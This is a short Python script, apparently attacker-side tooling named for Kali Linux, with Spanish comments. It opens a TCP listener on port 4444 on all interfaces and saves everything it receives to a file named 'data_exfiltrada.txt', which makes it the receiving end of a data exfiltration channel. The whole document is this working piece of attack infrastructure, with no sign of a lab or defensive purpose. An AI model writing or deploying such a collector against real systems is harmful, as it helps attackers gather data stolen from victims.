# kali_listener.py
import socket

HOST = '0.0.0.0'  # Escucha en todas las interfaces
PORT = 4444

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[+] Esperando conexión en {HOST}:{PORT}...")
    conn, addr = s.accept()
    with conn:
        print(f"[+] Conexión establecida desde {addr}")
        with open("data_exfiltrada.txt", "wb") as f:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                f.write(data)
        print("[+] Datos recibidos y guardados.")
